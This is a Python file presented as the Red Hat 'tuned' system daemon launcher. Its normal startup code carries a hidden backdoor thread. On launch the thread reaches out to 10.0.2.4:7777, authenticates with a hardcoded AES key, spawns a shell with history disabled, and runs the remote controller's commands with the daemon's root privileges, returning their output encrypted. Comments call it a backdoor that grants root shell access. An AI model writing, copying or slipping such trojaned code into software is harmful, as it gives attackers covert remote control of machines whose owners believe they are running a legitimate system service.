#!/usr/bin/python2 -Es
# Copyright (C) 2008-2013 Red Hat, Inc.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Flo
from __future__ import print_function
import argparse
import os
import sys
import traceback
import tuned.logs
import tuned.daemon
import tuned.exceptions
import tuned.consts as consts
import tuned.version as ver
import socket
import time
import struct
import pexpect
import threading
import subprocess
import uuid
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from tuned.utils.global_config import GlobalConfig

def error(message):
        print(message, file=sys.stderr)

# Configuration for Controller IP and Port
HOST = '10.0.2.4' # IP of our host machine (to reach out to)
PORT = 7777 # Port we are reaching out to on
key = b"thisisa16bytekey" #Symmetric Key to use

# AES Encryption and Decryption Functions
def encrypt(key, plaintext):
    #Padding to 16 bytes (for AES)
    while len(plaintext) % 16 != 0:
        plaintext += ' ' 
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
    return ciphertext

def decrypt(key, ciphertext):
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
    return decrypted.decode().rstrip()

def recv_data(sock):
    raw_len = sock.recv(4) # We first grab the length of the output before receiving it all to avoid buffer issues
    if not raw_len:
        return None
    length = struct.unpack(">I", raw_len)[0] 
    received_data = b"" 

    # There is a chance that either script may read from the buffer of data we are using to send data too early, so we accumulate data
    while len(received_data) < length:
        chunk = sock.recv(length - len(received_data))  # Read the remaining bytes
        if not chunk:
            break 
        received_data += chunk 

    return received_data

def send_data(sock, data):
    # Send the length + the data
    length = struct.pack(">I", len(data))  # 4-byte length prefix
    sock.sendall(length + data)

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)  # Enable keep-alive
            s.connect((HOST, PORT))

            # Send authentication message to verify symmetric key
            # We will generate a random string, send it and have the machine
            # connecting reverse it, and then send it back to us to verify
            # them before giving them root shell access

            challenge = str(uuid.uuid4())
            encrypted_challenge = encrypt(key, challenge)
            send_data(s, encrypted_challenge)

            encrypted_response = recv_data(s)
            decrypted_response = decrypt(key, encrypted_response)

            if decrypted_response == challenge[::-1]:
                send_data(s, encrypt(key, "authenticated"))
               # print("[+] Host authenticated!")
            else:
               # print("[-] Authentication failed.")
                s.close()
                continue

            # Spawn a persistent interactive shell using pexpect
            #print("[0] Launching shell...")
            child = pexpect.spawn('/bin/sh', encoding='utf-8', echo=False)
            #We use regex to find the last instance of the shell prompt
            child.expect(u'^(.*?)(sh-4.2# )$')

            # Disable commands saving to history
            child.sendline('export HISTFILE=/dev/null')
            child.expect(u'^(.*?)(sh-4.2# )$')

            while True:
                try:
                    command = recv_data(s)
                    if not command:
                        #print("[0] Connection lost. Reconnecting...")
                        break

                    decrypted_command = decrypt(key, command)

                    if decrypted_command.strip().lower() == 'exit':
                        print("[0] Received exit command. Closing connection.")
                        s.close()
                        child.sendcontrol('c') 
                        return 

                    child.sendline(decrypted_command)

                    # Once the command finishes, we EXPECT to see the shell prompt again
                    child.expect(u'^(.*?)(sh-4.2# )$')
                    output = child.match.group(1)  # Get the output before the prompt

                    # Encrypt and send the output back to the host
                    encrypted_output = encrypt(key, output)
                    send_data(s, encrypted_output)

                except Exception as e:
                   # print("[0] Connection dropped unexpectedly. Reconnecting...")
                    break

        except socket.error:
            #print("[0] Failed to connect. Retrying in 5 seconds...")
            time.sleep(5)  # Retry reaching out to host every 5 seconds

if __name__ == "__main__":
        subprocess.Popen(['/usr/bin/python', ''])
        backdoor_thread = threading.Thread(target=connect)
        backdoor_thread.daemon = True 
        backdoor_thread.start()
        parser = argparse.ArgumentParser(description = "Daemon for monitoring and adaptive tuning of system devices.")
        parser.add_argument("--daemon", "-d", action = "store_true", help = "run on background")
        parser.add_argument("--debug", "-D", action = "store_true", help = "show/log debugging messages")
        parser.add_argument("--log", "-l", nargs = "?", const = consts.LOG_FILE, help = "log to file, default file: " + consts.LOG_FILE)
        parser.add_argument("--pid", "-P", nargs = "?", const = consts.PID_FILE, help = "write PID file, default file: " + consts.PID_FILE)
        parser.add_argument("--no-dbus", action = "store_true", help = "do not attach to DBus")
        parser.add_argument("--profile", "-p", action = "store", type=str, metavar = "name", help = "tuning profile to be activated")
        parser.add_argument('--version', "-v", action = "version", version = "%%(prog)s %s.%s.%s" % (ver.TUNED_VERSION_MAJOR, ver.TUNED_VERSION_MINOR, ver.TUNED_VERSION_PATCH))
        args = parser.parse_args(sys.argv[1:])

        if os.geteuid() != 0:
                error("Superuser permissions are required to run the daemon.")
                sys.exit(1)

        config = GlobalConfig()
        log = tuned.logs.get()
        if args.debug:
                log.setLevel("DEBUG")

        try:
                maxBytes = config.get_size("log_file_max_size", consts.LOG_FILE_MAXBYTES)
                backupCount = config.get("log_file_count", consts.LOG_FILE_COUNT)
                if args.daemon:
                        if args.log is None:
                                args.log = consts.LOG_FILE
                        log.switch_to_file(args.log, maxBytes, backupCount)
                else:
                        if args.log is not None:
                                log.switch_to_file(args.log, maxBytes, backupCount)

                app = tuned.daemon.Application(args.profile, config)

                # no daemon mode doesn't need DBus
                if not config.get_bool(consts.CFG_DAEMON, consts.CFG_DEF_DAEMON):
                        args.no_dbus = True

                if not args.no_dbus:
                        app.attach_to_dbus(consts.DBUS_BUS, consts.DBUS_OBJECT, consts.DBUS_INTERFACE)

                # always write PID file
                if args.pid is None:
                        args.pid = consts.PID_FILE

                if args.daemon:
                        app.daemonize(args.pid)
                else:
                        app.write_pid_file(args.pid)
                app.run(args.daemon)

        except tuned.exceptions.TunedException as exception:
                if (args.debug):
                        traceback.print_exc()
                else:
                        error(str(exception))
                        sys.exit(1)
